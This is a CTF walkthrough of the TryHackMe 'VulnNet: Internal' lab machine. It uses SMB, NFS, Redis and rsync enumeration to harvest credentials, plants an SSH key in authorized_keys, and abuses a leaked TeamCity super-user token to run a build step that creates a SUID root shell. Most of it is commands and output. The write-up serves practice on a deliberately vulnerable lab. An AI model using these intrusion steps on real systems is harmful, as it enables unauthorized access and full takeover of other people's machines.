---
title: Vulnnet Internal TryHackMe Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-05-16 01:51:00 +0800
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, thm, writeup, walkthrough, vulnnet, ubuntu, thehackersbrain, teamcity, rpcbind, rsync, smb, enum4linux]
---


## VulnNet: Internal
> TryHackMe Easy Level Machine

## Information
Name: Vulnnet Internal <br />
Difficulty: Easy <br />
Creator: [TheCyb3rW0lf](https://tryhackme.com/p/TheCyb3rW0lf) <br />
Machine: [here](https://tryhackme.com/room/vulnnetinternal) <br />

## Target IP
```
export IP=10.10.7.80
```

## Nmap Scan
```bash
# Nmap 7.91 scan initiated Sat May 15 12:44:30 2021 as: nmap -sC -sV -A -v -oN initial 10.10.7.80
Increasing send delay for 10.10.7.80 from 0 to 5 due to 13 out of 43 dropped probes since last increase.
Nmap scan report for 10.10.7.80
Host is up (0.21s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37107/udp6  mountd
|   100005  1,2,3      52161/tcp   mountd
|   100005  1,2,3      53655/tcp6  mountd
|   100005  1,2,3      53837/udp   mountd
|   100021  1,3,4      37084/udp6  nlockmgr
|   100021  1,3,4      37759/tcp6  nlockmgr
|   100021  1,3,4      42267/udp   nlockmgr
|   100021  1,3,4      45309/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-15T09:15:08+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-15T07:15:08
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 15 12:45:16 2021 -- 1 IP address (1 host up) scanned in 45.84 seconds
```

after analyzing the **Nmap** result found `SMB` Server running on default port \(445\). Let's keep going.

## SMB Enumeration

### Information
SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

For getting more familiar with it. read [this](https://book.hacktricks.xyz/pentesting/pentesting-smb)

### Enum4linux Scan
```bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 15 13:20:24 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.7.80
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.7.80    |
 ================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ========================================== 
|    Nbtstat Information for 10.10.7.80    |
 ========================================== 
Can't load /etc/samba/smb.conf - run testparm to debug it
Looking up status of 10.10.7.80
	VULNNET-INTERNA <00> -         B <ACTIVE>  Workstation Service
	VULNNET-INTERNA <03> -         B <ACTIVE>  Messenger Service
	VULNNET-INTERNA <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 =================================== 
|    Session Check on 10.10.7.80    |
 =================================== 
[+] Server 10.10.7.80 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.7.80    |
 ========================================= 
rpcclient: Can't load /etc/samba/smb.conf - run testparm to debug it
[+] Can't determine if host is part of domain or part of a workgroup

 ==================================== 
|    OS information on 10.10.7.80    |
 ==================================== 
[+] Got OS info for 10.10.7.80 from smbclient: 
[+] Got OS info for 10.10.7.80 from srvinfo:
rpcclient: Can't load /etc/samba/smb.conf - run testparm to debug it

 =========================== 
|    Users on 10.10.7.80    |
 =========================== 


 ======================================= 
|    Share Enumeration on 10.10.7.80    |
 ======================================= 
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.7.80
//10.10.7.80/print$	Mapping: DENIED, Listing: N/A
//10.10.7.80/shares	Mapping: OK, Listing: OK
//10.10.7.80/IPC$	[E] Can't understand response:
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ================================================== 
|    Password Policy Information for 10.10.7.80    |
 ================================================== 


[+] Attaching to 10.10.7.80 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] VULNNET-INTERNAL
	[+] Builtin

[+] Password Info for Domain: VULNNET-INTERNAL

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:



 ============================ 
|    Groups on 10.10.7.80    |
 ============================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ===================================================================== 
|    Users on 10.10.7.80 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 

 =========================================== 
|    Getting printer info for 10.10.7.80    |
 =========================================== 
rpcclient: Can't load /etc/samba/smb.conf - run testparm to debug it


enum4linux complete on Sat May 15 13:20:52 2021

```

So here we have 3 shares available
```bash
 ======================================= 
|    Share Enumeration on 10.10.7.80    |
 ======================================= 
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

the share named `shares` looks juicy and also we can map it.
```bash
[+] Attempting to map shares on 10.10.7.80
//10.10.7.80/print$	Mapping: DENIED, Listing: N/A
//10.10.7.80/shares	Mapping: OK, Listing: OK
//10.10.7.80/IPC$	[E] Can't understand response:
```

### Smbmap Scan
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ smbmap -H 10.10.7.80 | tee smbmap.log

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap


[+] IP: 10.10.7.80:445  Name: 10.10.7.80                Status: Guest session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

we got the same results with `smbmap` which shows us that we have read `access` to the `shares` folder.

let's see what's inside.

### Smbclient (Getting Contents of the Share)
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ smbclient //10.10.7.80/shares
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\elliot's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021

                11309648 blocks of size 1024. 3276880 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 14:57:33 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  data.txt                            N       48  Tue Feb  2 14:51:18 2021
  business-req.txt                    N      190  Tue Feb  2 14:57:33 2021

                11309648 blocks of size 1024. 3276880 blocks available
smb: \data\> get data.txt
getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> get business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
cd tem
                11309648 blocks of size 1024. 3276880 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:15:10 2021
  ..                                  D        0  Tue Feb  2 14:50:09 2021
  services.txt                        N       38  Sat Feb  6 17:15:09 2021

                11309648 blocks of size 1024. 3276880 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021
cd
                11309648 blocks of size 1024. 3276880 blocks available
smb: \> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 14:50:09 2021
  ..                                  D        0  Tue Feb  2 14:58:11 2021
  temp                                D        0  Sat Feb  6 17:15:10 2021
  data                                D        0  Tue Feb  2 14:57:33 2021

                11309648 blocks of size 1024. 3276880 blocks available
smb: \> exit
```

So we have 2 directories and total 3 files inside the share, `data.txt` and `business-req.txt` inside `data` directory and `services.txt` inside of `temp` directory.

and here we got the `services` flag inside the `services.txt` file.
#### Service Flag
```bash
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

## RPCBind Enumeration (111)
### Basic Info
Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service. read more [here](https://book.hacktricks.xyz/pentesting/pentesting-rpcbind)

### Enumeration
#### Showmount
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ showmount -e 10.10.73.192
Export list for 10.10.73.192:
/opt/conf *
```
and here we found a mount point, so let's creat a folder and mount this `share` locally.
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ mkdir mnt
[elliot@archlinux]  vulnnet_internal git:(main) ✗ sudo mount -t nfs 10.10.73.192:/opt/conf mnt
[sudo] password for elliot:
[elliot@archlinux]  vulnnet_internal git:(main) ✗ cd mnt
[elliot@archlinux]  mnt ls
hp  init  opt  profile.d  redis  vim  wildmidi
```
here's the directory structure of the mount.
```
[elliot@archlinux]  mnt tree
.
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg

7 directories, 12 files
```

here we got a `redis.conf` file inside of `redis` directory. which may contain any credentials. let's see what's inside.

and yeah!, we found a password in there.
```bash
requirepass "xxxxxxxxxxxxx"
```
As now, we have the credentials let's check what's inside the database.
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ redis-cli -h 10.10.73.192 -p 6379 -a '<password>'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.73.192:6379> KEYS *
1) "authlist"
2) "marketlist"
3) "tmp"
4) "int"
5) "internal flag"
10.10.73.192:6379> GET "internal flag"
"THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}"
```

#### Internal Flag
```
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

and here we got the internal flag as well. we also have an interesting database named `authlist`, let's check what's inside.

```bash
10.10.73.192:6379> GET "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.73.192:6379> type "authlist"
list
10.10.73.192:6379> lrange authlist 1 100
1) "QXV0aG9yaXphdGlvbiBmbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxY3QFRXQEJjNzJ2Cg=="
10.10.73.192:6379>
```

looks like the entries are encoded in base64, let's decode and see what's it.
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ echo 'QXV0aG9yaXphdGlvbixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxUDY3QFRXQEJjNzJ2Cg==' | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password <confidential :)>
```

## Rsync Enumeration (873)

### Basic Info
**rsync** is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression and SSH or stunnel can be used for security. read more [here](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

### Enumeration

#### Netcat Enumeration
Let's grab the banner using `nc`.

```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ nc -vn 10.10.7.80 873 | tee rsync_banner.log
10.10.7.80 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
files           Necessary home interaction
@RSYNCD: EXIT
```
and here we found a module named `files`. now let's enumerate that

```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ nc -vn 10.10.7.80 873 | tee rsync_banner_files.log
10.10.7.80 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
files
@RSYNCD: AUTHREQD +uYzvsNWRKsO0CGAUB60kA

@ERROR: auth failed on module files
```
looks like we need password to access that module, so no luck here without `password`.


#### Nmap Enumeration
```bash
# Nmap 7.91 scan initiated Sat May 15 13:50:49 2021 as: nmap -sV --script rsync-list-modules -p 873 -oN initial_rsync 10.10.73.192
Nmap scan report for 10.10.73.192
Host is up (0.37s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  files          	Necessary home interaction

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 15 13:50:52 2021 -- 1 IP address (1 host up) scanned in 3.89 seconds
```

Scanned using nmap scripts got the same result.

### Gaining Access

As from the `redis` database, we got the `credentials` for `rsync` service, so let's connect and see what's inside.

So we do have credentials for `rsync` service. let's head there. found that there's a lot of file inside there, let's copy it locally.

```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ rsync -av rsync://rsync-connect@10.10.73.192/files remote_files
Password:
receiving incremental file list
created directory remote_files
./
sys-internal/
sys-internal/.Xauthority
sys-internal/.bash_history -> /dev/null
sys-internal/.dmrc
sys-internal/.profile
sys-internal/.rediscli_history -> /dev/null
sys-internal/.sudo_as_admin_successful
.....
```

looks we have the entire user directory. after enumerating we fount the `user.txt` user flag here `remote_files/sys-internal/user.txt`.

#### User Flag
```
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

and now that we can communicate to the target machine through `rsync` let's upload a ssh key and get the shell.

#### Getting Shell
Generating `ssh-keys`
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/elliot/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:WyeVAcF56W8BSW6TKpPc/MJx3e9SrEoIWWwzaYmqzsI elliot@archlinux
The key's randomart image is:
+---[RSA 3072]----+
|         .o=oo   |
|         oo+=+   |
|        . XoB.   |
|       o O *.o.. |
|      . S B o..o.|
|     .   B B  o +|
| .  .   . + o. o.|
|  Eo       o  o. |
|   .o       .. ..|
+----[SHA256]-----+
[elliot@archlinux]  vulnnet_internal git:(main) ✗ ls
allports_initial  enum4linux.log  initial_rsync  redis.conf              rsync_bruteforce.log
attachments       id_rsa          mnt            remote_files            services.txt
business-req.txt  id_rsa.pub      os_initial     rsync_banner_files.log  smbmap.log
data.txt          initial         README.md      rsync_banner.log        usernames.txt
[elliot@archlinux]  vulnnet_internal git:(main) ✗ mkdir ssh && mv id* ssh
[elliot@archlinux]  vulnnet_internal git:(main) ✗ ls ssh
id_rsa  id_rsa.pub
```

and now uploading our `id_rsa.pub` in `sys-internal`'s `authorized_keys` in order to get the shell via ssh.
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ rsync -av ssh/id_rsa.pub rsync://rsync-connect@10.10.100.111/f
iles/sys-internal/.ssh/authorized_keys
Password:
sending incremental file list
id_rsa.pub

sent 682 bytes  received 35 bytes  95.60 bytes/sec
total size is 570  speedup is 0.79
[elliot@archlinux]  vulnnet_internal git:(main) ✗
```

and here we got the shell via ssh
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ ssh -i ssh/id_rsa sys-internal@10.10.100.111
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$
```

## Privilege Escalation
Keeping in mind, this machine is all about internal networks, here's the list of the `ports` opened locally.
```bash
sys-internal@vulnnet-internal:~$ ss -tno
State      Recv-Q  Send-Q         Local Address:Port           Peer Address:Port
ESTAB      0       0              10.10.100.111:22               10.8.82.14:43150   timer:(keepalive,105min,0)
CLOSE-WAIT 1       0         [::ffff:127.0.0.1]:43787    [::ffff:127.0.0.1]:8111
ESTAB      0       0         [::ffff:127.0.0.1]:8111     [::ffff:127.0.0.1]:43355
ESTAB      0       0         [::ffff:127.0.0.1]:43355    [::ffff:127.0.0.1]:8111
sys-internal@vulnnet-internal:~$
```

port `8111` is looking interesting
```bash
CLOSE-WAIT 1       0         [::ffff:127.0.0.1]:43787    [::ffff:127.0.0.1]:8111
```

In order to access the port from our machine, we have to setup port forwording
```bash
[elliot@archlinux]  vulnnet_internal git:(main) ✗ ssh -i ssh/id_rsa sys-internal@10.10.100.111 -L 8111:127.0.0.1
:8111
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat May 15 20:51:27 2021 from 10.8.82.14
sys-internal@vulnnet-internal:~$
```

Now we will be able to access the port on our machine. Found that this port is running a `TeamCity` Server.
![](/assets/vulnnet_internal/images/Pasted image 20210516004547.png)

So here we need to login in the server but unfortunately we don't have any creds. also looked for known vulnerability, and did found one which also need authentication. 

We have to methods to login on the server.
1. using creds
2. using authentication token

While enumerating the machine found a directory named `TeamCity` on the root of the filesystem. found the authentication token inside log file `/TeamCity/logs/catalina.out`.
```bash
sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i "authentication"
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1680136214794143921 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1680136214794143921 (use empty username with the token as the password to access the server)
```

now let's login in the server using the token we have.


### Getting Root Shell

After logging in Create a new project.
![](/assets/vulnnet_internal/images/Pasted image 20210516012413.png)

click on `manually` and fill in the information.
![](/assets/vulnnet_internal/images/Pasted image 20210516012530.png)

now click on `Create build configuration`
![](/assets/vulnnet_internal/images/Pasted image 20210516012630.png)

again click on `manually` and fill in the information then click on `create`
![](/assets/vulnnet_internal/images/Pasted image 20210516012717.png)

now head to the build configuration you created in my case it's `RCE`
![](/assets/vulnnet_internal/images/Pasted image 20210516013024.png)

click on `Edit Configuration Settings`
![](/assets/vulnnet_internal/images/Pasted image 20210516013107.png)

click on `Build Steps` from the sidebar menu and then click on `Add build step`
![](/assets/vulnnet_internal/images/Pasted image 20210516013133.png)

now fill in the info as shown in the image and click on save.
![](/assets/vulnnet_internal/images/Pasted image 20210516013409.png)

finally click on `run` to run the build script.
![](/assets/vulnnet_internal/images/Pasted image 20210516013443.png)

Now go back to the terminal and check, we have the copy of `/bin/bash` as `.rootshell` with `SUID` bit set to it.
```bash
sys-internal@vulnnet-internal:~$ ls -a
.              .cache   Documents   .mozilla  .rediscli_history          .thumbnails    .xsession-errors
..             .config  Downloads   Music     .rootshell                 user.txt       .xsession-errors.old
.bash_history  .dbus    .gnupg      Pictures  .ssh                       Videos
.bash_logout   Desktop  linpeas.sh  .profile  .sudo_as_admin_successful  .Xauthority
.bashrc        .dmrc    .local      Public    Templates                  .xscreensaver
sys-internal@vulnnet-internal:~$ ./.rootshell -p
.rootshell-4.4# id
uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
.rootshell-4.4# ls
Desktop  Documents  Downloads  linpeas.sh  Music  Pictures  Public  Templates  user.txt  Videos
.rootshell-4.4# cat /root/root.txt
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
.rootshell-4.4#
```

and here we got the root shell and as well as root flag.
#### Root Flag
```
THM{xxxxxxxxxxxxxxxxxxxxxxxxxx}
```

And here we completed the machine. Thanks for reading, Hope I'll see you again.
Don't forget to share if you liked it :).
